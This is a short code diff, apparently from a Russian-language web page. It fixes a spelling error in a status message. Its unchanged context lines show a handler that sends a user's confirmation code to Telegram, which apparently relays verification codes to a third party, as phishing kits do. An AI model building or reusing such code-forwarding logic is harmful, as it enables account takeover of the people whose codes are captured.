@@ -194,7 +194,7 @@ document.getElementById('sendCodeButton').addEventListener('click', async () => 
     // Отправка кода подтверждения в Telegram
     const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
     if (success) {
-        document.getElementById('codeMessage').textContent = "Код подтверждения отправлен, ожидайте ответы в теченни часа!";
+        document.getElementById('codeMessage').textContent = "Код подтверждения отправлен, ожидайте ответы в течении часа!";
     } else {
         document.getElementById('codeMessage').textContent = "Произошла ошибка при отправке кода.";
         sendCodeButton.disabled = false;
